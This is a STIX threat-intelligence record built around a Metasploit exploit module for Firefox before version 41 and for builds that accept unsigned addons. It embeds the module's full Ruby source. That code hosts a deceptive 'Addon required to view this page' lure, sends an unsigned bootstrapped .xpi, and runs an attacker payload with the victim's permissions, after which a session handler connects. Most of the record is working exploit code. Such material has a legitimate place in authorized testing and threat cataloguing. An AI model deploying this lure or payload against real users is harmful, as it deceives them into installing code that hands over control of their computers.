{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--81330c31-94ea-4a65-a170-8969e0cb981d",
    "created": "2024-08-14T17:05:46.881377Z",
    "modified": "2024-08-14T17:05:46.88138Z",
    "name": "Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution",
    "description": " Mozilla Firefox before version 41 allowed users to install unsigned browser extensions from arbitrary web servers.  This module dynamically creates an unsigned .xpi addon file. The resulting bootstrapped Firefox addon is presented to the victim via a web page. The victim's Firefox browser will pop a dialog asking if they trust the addon.  Once the user clicks \"install\", the addon is installed and executes the payload with full user permissions. As of Firefox 4, this will work without a restart as the addon is marked to be \"bootstrapped\". As the addon will execute the payload after each Firefox restart, an option can be given to automatically uninstall the addon once the payload has been executed.  As of Firefox 41, unsigned extensions can still be installed on Firefox Nightly, Unbranded and Development builds when configured with `xpinstall.signatures.required` set to `false`.  Note: this module generates legacy extensions which are supported only in Firefox before version 57.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_xpi_bootstrapped_addon.rb",
            "external_id": "firefox_xpi_bootstrapped_addon.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.mozilla.org/addons/2015/02/10/extension-signing-safer-experience/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.mozilla.org/addons/2015/04/15/the-case-for-extension-signing/"
        },
        {
            "source_name": "reference",
            "url": "https://support.mozilla.org/en-US/kb/frequently-asked-questions-firefox-addon"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20170727035940/https://developer.mozilla.org/en-US/Add-ons/Bootstrapped_extensions"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20160322014439/https://dvlabs.tippingpoint.com/blog/2007/06/27/xpi-the-next-malware-vector"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::FirefoxAddonGenerator\n\n  def initialize( info = {} )\n    super( update_info( info,\n      'Name'          => 'Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution',\n      'Description'   => %q{\n        Mozilla Firefox before version 41 allowed users to install\n        unsigned browser extensions from arbitrary web servers.\n\n        This module dynamically creates an unsigned .xpi addon file.\n        The resulting bootstrapped Firefox addon is presented to\n        the victim via a web page. The victim's Firefox browser\n        will pop a dialog asking if they trust the addon.\n\n        Once the user clicks \"install\", the addon is installed and\n        executes the payload with full user permissions. As of Firefox\n        4, this will work without a restart as the addon is marked to\n        be \"bootstrapped\". As the addon will execute the payload after\n        each Firefox restart, an option can be given to automatically\n        uninstall the addon once the payload has been executed.\n\n        As of Firefox 41, unsigned extensions can still be installed\n        on Firefox Nightly, Unbranded and Development builds when\n        configured with `xpinstall.signatures.required` set to `false`.\n\n        Note: this module generates legacy extensions which are\n        supported only in Firefox before version 57.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [ 'mihi', 'joev' ],\n      'DisclosureDate' => '2007-06-27',\n      'References'    => [\n        [ 'URL', 'https://blog.mozilla.org/addons/2015/02/10/extension-signing-safer-experience/' ],\n        [ 'URL', 'https://blog.mozilla.org/addons/2015/04/15/the-case-for-extension-signing/' ],\n        [ 'URL', 'https://support.mozilla.org/en-US/kb/frequently-asked-questions-firefox-addon' ],\n        [ 'URL', 'https://web.archive.org/web/20170727035940/https://developer.mozilla.org/en-US/Add-ons/Bootstrapped_extensions' ],\n        [ 'URL', 'https://web.archive.org/web/20160322014439/https://dvlabs.tippingpoint.com/blog/2007/06/27/xpi-the-next-malware-vector' ]\n      ],\n      'Notes' => {\n        'Reliability' => [REPEATABLE_SESSION],\n        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, SCREEN_EFFECTS],\n        'Stability' => [CRASH_SAFE]\n      }\n    ))\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri.match(/\\.xpi$/i)\n      # browser has navigated to the .xpi file\n      print_status(\"Sending xpi and waiting for user to click 'accept'...\")\n      if not xpi = generate_addon_xpi(cli)\n        print_error(\"Failed to generate the payload.\")\n        send_not_found(cli)\n      else\n        send_response(cli, xpi.pack, { 'Content-Type' => 'application/x-xpinstall' })\n      end\n    else\n      # initial browser request\n      # force the user to access a directory-like URL\n      if not request.uri.match(/\\/$/)\n        print_status(\"Redirecting request.\" )\n        send_redirect(cli, \"#{get_resource}/\")\n      else\n        # user has navigated\n        print_status(\"Sending HTML response.\" )\n        send_response_html(cli, generate_html)\n      end\n    end\n\n    handler(cli)\n  end\n\n  def generate_html\n    html  = %Q|<html><head><title>Loading, Please Wait...</title>\\n|\n    html << %Q|<meta http-equiv=\"refresh\" content=\"0; url=addon.xpi\"></head>\\n|\n    html << %Q|<body><center><p>Addon required to view this page. <a href=\"addon.xpi\">[Install]</a></p></center>\\n|\n    html << %Q|</body></html>|\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-06-27"
}